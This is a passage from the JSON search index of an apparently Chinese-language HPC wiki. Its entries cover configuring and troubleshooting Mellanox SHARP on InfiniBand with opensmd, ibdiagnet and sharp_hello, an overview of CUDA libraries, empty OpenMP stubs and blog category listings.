\u901a\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u7f51\u5361\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u8fd0\u884c-sharp","title":"\u8fd0\u884c SHARP","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u5f00\u542f-am","title":"\u5f00\u542f AM","text":"<p>SHARP \u7f51\u7edc\u5305\u62ec\u82e5\u5e72\u4e2a\u8ba1\u7b97\u8282\u70b9\u548c\u4e00\u4e2a\u805a\u5408\u7ba1\u7406\u8005\uff08AM\uff09\uff0c\u5176\u4e2d AM \u4e0d\u53ef\u4ee5\u4f5c\u4e3a\u8ba1\u7b97\u8282\u70b9\u3002\u4e3a\u4e86\u8fd0\u884c SHARP\uff0c</p> <ul> <li> <p>\u670d\u52a1\u5668\u542f\u52a8\u65f6\u53ef\u80fd\u9ed8\u8ba4\u5f00\u542f\u4e86 SubnetManager \u670d\u52a1\uff0c\u8ba1\u7b97\u8282\u70b9\u9700\u8981\u624b\u52a8\u5173\u6389\u8fd9\u4e00\u670d\u52a1\uff1a</p> <pre><code>sudo systemctl stop opensmd\n</code></pre> </li> <li> <p>AM \u5f00\u542f AM \u670d\u52a1\uff1a</p> <pre><code>sudo /opt/mellanox/sharp/sbin/sharp_daemons_setup.sh -s -d sharp_am\nsudo service sharp_am start\n</code></pre> </li> <li> <p>AM \u670d\u52a1\u9700\u8981\u642d\u8f7d\u5728 SubnetManager \u4e0a\u9762\uff0c\u56e0\u6b64\u9700\u8981\u91cd\u542f SubnetManager\uff1a</p> <pre><code>sudo systemctl start opensmd\n</code></pre> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u68c0\u67e5\u914d\u7f6e\u72b6\u6001","title":"\u68c0\u67e5\u914d\u7f6e\u72b6\u6001","text":"<p>\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7 <code>ibdiagnet</code> \u670d\u52a1\u786e\u8ba4 SHARP \u7684\u914d\u7f6e\u72b6\u6001\uff1a</p> <pre><code>sudo ibdiagnet --sharp\n</code></pre> <p><code>ibdiagnet</code> \u4e3b\u8981\u7684\u6ce8\u610f\u70b9\u6709\u4e24\u4e2a\uff1a\u7f51\u7edc\u4e2d\u5e94\u5f53\u53ea\u6709\u4e00\u4e2a SM\uff08\u5373 1 \u4e2a Master SM\uff0c\u6ca1\u6709 Standby SM\uff09\u3001\u5e94\u8be5\u5c3d\u91cf\u6ca1\u6709\u4efb\u4f55 Warnings \u548c Errors\u3002</p> <p>\u4e00\u4e9b\u53ef\u80fd\u7684\u6545\u969c\uff1a</p> <ul> <li>Warnings \u548c Errors \u90fd\u662f N/A\uff1a\u8fd0\u884c ibdiagnet \u7684\u65f6\u5019\u6ca1\u52a0 sudo\uff0c\u6216\u8005\u7f51\u5361\u7269\u7406\u4e0a\u6ca1\u8fde\u63a5\u5230\u4ea4\u6362\u673a\uff0c\u6216\u8005 ibstat \u663e\u793a\u7f51\u5361 Physical State \u5728 Initializing \u7684\u72b6\u6001\uff08\u8fd9\u4e00\u4e2a case \u540e\u9762\u201c\u91cd\u542f\u4ea4\u6362\u673a\u7684\u6ce8\u610f\u70b9\u201d\u8ba8\u8bba\uff09\uff1b</li> <li>Port Counters \u51fa\u73b0 \"vl15_dropped\" increased during the run \u7684 Error\uff1a\u7f51\u5361\u6216\u4ea4\u6362\u673a\u56fa\u4ef6\u8fc7\u65e7 / \u4e0d\u5339\u914d\u5bfc\u81f4 SHARP \u6ca1\u6709\u6210\u529f\u8fd0\u884c\u8d77\u6765\uff1b</li> <li>Speed/Width Checks \u51fa\u73b0 Error\uff1a\u7f51\u5185\u7f51\u5361\u901f\u5ea6\u4e0d\u4e00\u81f4\u3002\u8fd9\u4e2a\u95ee\u9898\u4e0d\u81f4\u547d\uff0c\u8fd0\u884c SHARP \u65f6\u4f1a\u4ee5\u6700\u6162\u7684\u7f51\u5361\u4e3a\u51c6\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u8fd0\u884c-hello_sharp-\u6d4b\u8bd5","title":"\u8fd0\u884c hello_sharp \u6d4b\u8bd5","text":"<p>\u5f53\u8fd0\u884c\u4e00\u4e9b\u57fa\u4e8e SHARP \u7684\u5e94\u7528\uff08\u5982 NCCL \u7b49\uff09\u65f6\uff0c\u4e00\u4e2a\u6210\u529f\u7684 hello_sharp \u6d4b\u8bd5\u53ef\u4ee5\u548c\u6210\u529f\u7684 ibdiagnet \u7ed3\u679c\u53ef\u4ee5\u6392\u9664 SHARP \u672c\u8eab\u4ea7\u751f\u7684\u95ee\u9898\uff0c\u4ece\u800c\u5e2e\u4f60\u7f29\u5c0f\u95ee\u9898\u8303\u56f4\u5230\u4e0a\u5c42\u5e94\u7528\u3002\u56e0\u6b64\uff0c\u5e94\u5f53\u7ecf\u5e38\u6ce1\u4e00\u6ce1 ibdiagnet \u548c hello_sharp\uff1a</p> <pre><code>sudo /opt/mellanox/sharp/bin/sharp_hello -d mlx5_1\n</code></pre> <p>\u6b63\u786e\u7684\u8f93\u51fa\uff1a</p> <p></p> <p>\u5e38\u89c1\u7684\u62a5\u9519\uff1a</p> <p></p> <p>\u539f\u56e0\uff1a</p> <ul> <li>\u5982\u679c ibdiagnet \u4e2d\u51fa\u73b0\u94fe\u8def\u901f\u5ea6\u5916\u7684 Error\uff0c\u8bf7\u5148\u4fee\u590d\u5176\u4e2d\u7684 Error/Warnings</li> <li>\u5982\u679c ibdiagnet \u4e2d\u6ca1\u6709 Error/Warning\uff0c\u90a3\u4e48\u5c31\u5355\u7eaf\u662f SHARP \u62bd\u98ce\u4e86\u3002\u6b64\u65f6\u91cd\u542f\u4ea4\u6362\u673a\u5373\u53ef\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u91cd\u542f\u4ea4\u6362\u673a\u7684\u6ce8\u610f\u70b9","title":"\u91cd\u542f\u4ea4\u6362\u673a\u7684\u6ce8\u610f\u70b9","text":"<p>\u91cd\u542f\u4ea4\u6362\u673a\u7684\u65b9\u6cd5\uff1aManaged Switch \u53ef\u4ee5\u8fdb\u4ea4\u6362\u673a reboot\uff0cUnmanaged Switch \u62d4\u7535\u4e0a\u7535\u91cd\u542f\u3002</p> <p>\u91cd\u542f\u4ea4\u6362\u673a\u540e\uff0c\u6700\u597d\u5bf9\u6bcf\u4e2a\u8282\u70b9\u90fd\u8fd0\u884c ibstat \u67e5\u770b\u94fe\u8def\u8fde\u63a5\u72b6\u51b5\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4ea4\u6362\u673a\u542f\u52a8\u540e\u4e00\u6bb5\u65f6\u95f4\u6240\u6709\u7684\u7f51\u5361\u90fd\u4f1a\u5904\u4e8e LinkUp \u7684\u72b6\u6001\u3002</p> <p>\u4f46\u4e5f\u8981\u65f6\u5019\uff0c\u7f51\u5361\u7684 Physical State \u4f1a\u957f\u671f\u5904\u4e8e Initializing \u7684\u72b6\u6001\u3002\u6b64\u65f6\u5927\u6982\u7387\u662f\u7531\u4e8e IB \u7f51\u7edc\u4e2d\u7f3a\u5c11 SubnetManager \u6240\u81f4\u3002\u6b64\u65f6\u5efa\u8bae\u5c06 AM \u8282\u70b9\u7684 AM \u670d\u52a1\u548c opensmd \u670d\u52a1\u91cd\u65b0\u542f\u52a8\uff0c\u901a\u5e38\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/","title":"OpenMP","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#openmp","title":"OpenMP","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u7b80\u4ecb","title":"\u7b80\u4ecb","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u7f16\u8bd1\u8fd0\u884c-openmp-\u7a0b\u5e8f","title":"\u7f16\u8bd1\u8fd0\u884c OpenMP \u7a0b\u5e8f","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#fork-join-\u6a21\u578b","title":"Fork-Join \u6a21\u578b","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u57fa\u672c\u6307\u5bfc\u8bed\u53e5","title":"\u57fa\u672c\u6307\u5bfc\u8bed\u53e5","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u4efb\u52a1\u5e76\u884c","title":"\u4efb\u52a1\u5e76\u884c","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u7ebf\u7a0b\u8c03\u5ea6","title":"\u7ebf\u7a0b\u8c03\u5ea6","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u6570\u636e\u7ade\u4e89\u4e0e\u7ebf\u7a0b\u540c\u6b65","title":"\u6570\u636e\u7ade\u4e89\u4e0e\u7ebf\u7a0b\u540c\u6b65","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u539f\u5b50\u64cd\u4f5c","title":"\u539f\u5b50\u64cd\u4f5c","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u4e34\u754c\u533a","title":"\u4e34\u754c\u533a","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u89c4\u7ea6","title":"\u89c4\u7ea6","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#\u8bef\u533a\u4e0e\u9677\u9631","title":"\u8bef\u533a\u4e0e\u9677\u9631","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/openmp/#first-touch","title":"First Touch","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/others/","title":"\u5176\u4ed6","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/others/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/gpu/cuda/","title":"CUDA","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/gpu/cuda/#cuda","title":"CUDA","text":"<p>CUDA \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u7684\u6574\u4f53\u7ed3\u6784\u5c42\u6b21\u5982\u4e0a\u56fe\u6240\u793a\u3002HPC \u65b9\u5411\u4e3b\u8981\u9700\u8981\u4e86\u89e3 HPC SDK \u7b49\u8f83\u4e0a\u5c42\u7684\u6a21\u5757\uff0c\u5982\u4f55\u4f7f\u7528\u3002\u6d89\u53ca\u8fd0\u7ef4\u3001\u529f\u8017\u63a7\u5236\u7b49\u65b9\u9762\u65f6\uff0c\u4e5f\u4f1a\u6d89\u53ca\u9a71\u52a8\u4e2d\u7684 NVML \u7b49\u6a21\u5757\u3002\u4e0b\u9762\u6311\u9009\u5e38\u7528\u7684\u6a21\u5757\u4f5c\u4e00\u4e9b\u4ecb\u7ecd\uff1a</p> <ul> <li>HPC SDK\uff1a\u5176\u5b9e\u5c31\u662f\u628a HPC \u5e38\u7528\u7684\u5b50\u6a21\u5757\u6253\u5305\u5230\u4e86\u4e00\u8d77\u3002<ul> <li>\u5206\u6790\u90e8\u5206\u5305\u62ec Profiles\uff08Nsight\uff09\u548c Debugger\uff08cuda-gdb\uff09\u3002</li> </ul> </li> <li>Nsight\uff1a\u6709\u51e0\u4e2a\u5b50\u4ea7\u54c1\uff1a<ul> <li>System\uff1a\u7efc\u5408\u5206\u6790 CPU\u3001GPU \u7684\u6027\u80fd</li> <li>Compute\uff1akernel profiler\uff0c\u4e13\u95e8\u8c03\u8bd5\u6838\u51fd\u6570</li> <li>Graphics\uff1a\u8c03\u8bd5\u3001\u5206\u6790 Windows \u548c Linux \u5e73\u53f0\u56fe\u5f62\u5e94\u7528\u7684\u6027\u80fd</li> </ul> </li> <li>NVTX (Tools Extension Library)\uff1aC \u8bed\u8a00 API\uff0c\u63d0\u4f9b C++ \u548c Python \u63a5\u53e3\u3002Nsight \u7b49\u6027\u80fd\u5206\u6790\u5de5\u5177\u901a\u8fc7\u8be5 API \u8fdb\u884c\u6d4b\u91cf\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u8be5 API \u8fdb\u884c\u4e8b\u4ef6\u8bb0\u5f55\u7b49\u3002\u548c MPI \u7684 PMPI \u6709\u4e9b\u7c7b\u4f3c\u3002</li> <li>CUPTI (Profiling Tools Interface)\uff1a\u548c\u4e0a\u9762\u90a3\u4e2a\u529f\u80fd\u7c7b\u4f3c\uff0c\u5141\u8bb8\u5404\u79cd\u6d4b\u91cf\u548c\u6027\u80fd\u68c0\u6d4b\u7684 API\u3002</li> <li>NVML (NVIDIA Management Library)\uff1aC \u8bed\u8a00 API\uff0c\u76d1\u63a7\u548c\u7ba1\u7406 NVIDIA GPU \u8bbe\u5907\u3002API \u5206\u4e3a\u4e94\u4e2a\u6a21\u5757\uff1a\u521d\u59cb\u5316\u548c\u6e05\u7406\u3001\u67e5\u8be2\u3001\u63a7\u5236\u3001\u4e8b\u4ef6\u5904\u7406\u3001\u9519\u8bef\u62a5\u544a\u3002\u5e93\u6587\u4ef6 <code>libnvidia-ml.so</code>\uff0c\u94fe\u63a5\u53c2\u6570 <code>-lnvidia-ml</code>\u3002</li> <li>NCCL (NVIDIA Collective Communications Library)\uff1aC \u8bed\u8a00 API\uff0cMPI \u7684\u66ff\u4ee3\u54c1\u3002\u63d0\u4f9b\u591a GPU\u3001\u591a\u8282\u70b9\u901a\u4fe1\u539f\u8bed\u3002\u9002\u7528\u786c\u4ef6\uff1aNVLink\u3001Mellanox Network\u3002</li> <li>cuBLAS (Basic Linear Algebra)\uff1a\u63d0\u4f9b\u79d1\u5b66\u8ba1\u7b97\u548c AI \u6709\u5173\u7684\u6269\u5c55 API\uff0c\u7b26\u5408 BLAS \u548c GEMM API\u3002</li> <li>cuDNN (Deep Neural Network)\uff1aC \u8bed\u8a00 API\uff0c\u63d0\u4f9b C++ \u63a5\u53e3\uff0c\u63d0\u4f9b\u6df1\u5ea6\u795e\u7ecf\u7f51\u7edc\u7684\u76f8\u5173\u539f\u8bed\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/gpu/hip/","title":"HIP","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/gpu/hip/#hip","title":"HIP","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/gpu/model/","title":"\u6a21\u578b","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/gpu/model/#\u6a21\u578b","title":"\u6a21\u578b","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/gpu/others/","title":"Others","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/archive/2025/#2025","title":"2025","text":""},{"location":"blog/archive/2019/","title":"2019","text":""},{"location":"blog/archive/2019/#2019","title":"2019","text":""},{"location":"blog/archive/2018/","title":"2018","text":""},{"location":"blog/archive/2018/#2018","title":"2018","text":""},{"location":"blog/category/%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B/","title":"\u77ed\u5b66\u671f\u8bfe\u7a0b","text":""},{"location":"blog/category/%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B/#\u77ed\u5b66\u671f\u8bfe\u7a0b","title":"\u77ed\u5b66\u671f\u8bfe\u7a0b","text":""},{"location":"blog/category/%E8%BF%90%E7%BB%B4/","title":"\u8fd0\u7ef4","text":""},{"location":"blog/category/%E8%BF%90%E7%BB%B4/#\u8fd0\u7ef4","title":"\u8fd0\u7ef4","text":""},{"location":"blog/category/%E5%AF%86%E7%A0%81%E5%AD%A6/","title":"\u5bc6\u7801\u5b66","text":""},{"location":"blog/category/%E5%AF%86%E7%A0%81%E5%AD%A6/#\u5bc6\u7801\u5b66","title":"\u5bc6\u7801\u5b66","text":""},{"location":"blog/category/%E6%95%B0%E8%AE%BA/","title":"\u6570\u8bba","text":""},{"location":"blog/category/%E6%95%B0%E8%AE%BA/#\u6570\u8bba","title":"\u6570\u8bba","text":""},{"location":"blog/category/ai/","title":"AI","text":""},{"location":"blog/category/ai/#ai","title":"AI","text":""},{"location":"blog/category/meetingreport/","title":"MeetingReport","text":""},{"location":"blog/category/meetingreport/#meetingreport","title":"MeetingReport","text":""},{"location":"blog/category/zjusct/","title":"ZJUSCT","text":""},{"location":"blog/category/zjusct/#zjusct","title":"ZJUSCT","text":""},{"location":"blog/category/tech/","title":"Tech","text":""},{"location":"blog/category/tech/#tech","title":"Tech","text":""},{"location":"blog/category/operating-susyem/","title":"Operating Susyem","text":""},{"location":"blog/category/operating-susyem/#operating-susyem","title":"Operating Susyem","text":""},{"location":"blog/category/virtual-memory/","title":"Virtual Memory","text":""},{"location":"blog/category/virtual-memory/#virtual-memory","title":"Virtual Memory","text":""},{"location":"blog/category/tlb/","title":"TLB","text":""},{"location":"blog/category/tlb/#tlb","title":"TLB","text":""},{"location":"blog/category/mysql/","title":"MySQL","text":""},{"location":"blog/category/mysql/#mysql","title":"MySQL","text":""},{"location":"blog/category/centos/","title":"CentOS","text":""},{"location":"blog/category/centos/#centos","title":"CentOS","text":""},{"location":"blog/category/ml/","title":"ML","text":""},{"location":"blog/category/ml/#ml","title":"ML","text":""},{"location":"blog/category/tensorflow/","title":"Tensorflow","text":""},{"location":"blog/category/tensorflow/#tensorflow","title":"Tensorflow","text":""},{"location":"blog/category/cuda/","title":"CUDA","text":""},{"location":"blog/category/cuda/#cuda","title":"CUDA","text":""},{"location":"blog/category/profile/","title":"Profile","text":""},{"location":"blog/category/profile/#profile","title":"Profile","text":""},{"location":"blog/category/spc/","title":"Spc","text":""},{"location":"blog/category/spc/#spc","title":"Spc","text":""},{"location":"blog/category/zju/","title":"ZJU","text":""},{"location":"blog/category/zju/#zju","title":"ZJU","text":""},{"location":"blog/page/2/","title":"Index","text":""},{"location":"blog/page/2/#index","title":"Index","text":""}]}